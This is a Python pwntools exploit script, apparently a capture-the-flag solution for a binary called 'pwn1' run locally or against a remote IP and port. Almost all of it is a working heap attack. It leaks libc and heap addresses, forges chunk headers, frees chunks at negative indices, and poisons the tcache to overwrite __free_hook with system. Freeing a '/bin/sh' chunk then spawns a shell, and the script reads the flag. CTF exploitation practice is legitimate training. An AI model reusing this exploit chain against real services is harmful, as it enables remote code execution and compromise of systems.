from pwn import *
import sys

local       = 1
binary      = "./pwn1"
local_libc  = "/lib/x86_64-linux-gnu/libc.so.6"
ip          = "10.67.100.3"
port        = 7006
remote_libc = "./libc-2.31.so"


def main(ip=ip,port=port):
    global p,elf,libc
    elf = ELF(binary)
    if local:
        context.log_level   = "debug"
        p=process(binary)
        # p=process(binary,env={'LD_PRELOAD':'./libc-2.23.so'})
        libc = ELF(local_libc)
        pwn()
    else:
        p=remote(ip,port)
        libc=ELF(remote_libc)
        pwn()

def add(size,content='a'):
    p.sendlineafter(">> ",'1')
    p.sendlineafter("size: ",str(size))
    p.sendafter("content: ",content)
def delete(id):
    p.sendlineafter(">> ",'2')
    p.sendlineafter("index: ",str(id))
def show(id):
    p.sendlineafter(">> ",'3')
    p.sendlineafter("index: ",str(id))

def pwn():
    
    add(0x800,'a')
    add(0x800,'b')
    delete(0)
    add(0x800,'\xd0')
    show(0)
    p.recvuntil("content: ")
    leak_addr = u64(p.recv(6).ljust(8,'\x00')) - 80
    print "leak_addr:",hex(leak_addr)
    libc_addr = leak_addr - 0x1ebb80
    print "libc_addr:",hex(libc_addr)

    payload = 'a'*0x10
    payload += p64(0)+p64(0x71)
    add(0x68,payload)
    payload = 'a'*0x10
    payload += p64(0)+p64(0x51)
    add(0x68,payload)
    delete(2)
    delete(3)
    add(0x68,'\xb0')
    add(0x68,'\xb0')
    show(2)
    p.recvuntil("content: ")
    heap_addr = u64(p.recv(6).ljust(8,'\x00'))
    print "heap_addr:",hex(heap_addr)

    malloc_hook = libc_addr + libc.sym['__malloc_hook']
    print "malloc_hook:",hex(malloc_hook)
    free_hook = libc_addr + libc.sym['__free_hook']
    print "free_hook:",hex(free_hook)
    system = libc_addr + libc.sym['system']
    print "system:",hex(system)

    payload = p64(heap_addr+0x10)
    payload += p64(heap_addr+0x30)
    payload += p64(heap_addr+0x30)
    payload += p64(heap_addr+(0x5597062a5320-0x5597062a52b0)+0x10)

    add(0x20000,payload)

    delete(-16891)
    delete(-16893)#0x7f4b1d924018-0x7f4b1d945000 /8
    delete(-16894)#0x7ff98b47a010-0x7ff98b49b000 /8
    
    add(0x68,p64(0)*3+p64(0x71)+p64(free_hook)+p64(0))
    add(0x68,p64(free_hook)+p64(0))
    add(0x68,p64(system))
    add(0x68,'/bin/sh\x00')

    #debug(p,"b *$rebase(0x1526)")
    delete(8)
    

    p.interactive()

def cat_flag():
    global flag
    p.recv()
    p.sendline("cat flag")
    flag = p.recvuntil('\n',drop=True).strip()
    
def debug(p,content=''):
    if local:
        gdb.attach(p,content)
        raw_input()

if __name__ == "__main__":
    if(len(sys.argv)==3):
        ip      = sys.argv[1]
        port    = sys.argv[2]
    main()
